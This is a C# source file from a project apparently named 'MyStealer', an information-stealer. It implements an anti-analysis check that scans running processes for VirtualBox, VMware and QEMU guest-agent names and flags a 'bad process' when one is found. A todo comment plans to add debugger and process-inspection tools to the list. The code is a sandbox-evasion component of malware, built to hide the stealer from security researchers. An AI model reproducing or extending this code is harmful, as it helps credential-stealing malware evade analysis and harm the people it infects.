﻿using System;
using System.Diagnostics;

namespace MyStealer.AntiDebug.Check
{
    /// <summary>
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiVirtualization.cs#L182
    /// todo: add more processes such as IDA, ProcessHacker, etc.
    /// </summary>
    internal class Processes : CheckBase
    {
        public override string Name => "Processes";

        private readonly string[] processNames = new string[]
        {
            "VBoxService",
            "VGAuthService",
            "vmusrvc",
            "qemu-ga"
        };

        public override bool CheckPassive()
        {
            foreach (var process in Process.GetProcesses())
            {
                foreach (var name in processNames)
                {
                    if (string.Equals(process.ProcessName, name, StringComparison.OrdinalIgnoreCase))
                    {
                        Logger.Information("Bad process {name} found.", name);
                        return true;
                    }
                }
            }

            return false;
        }
    }
}
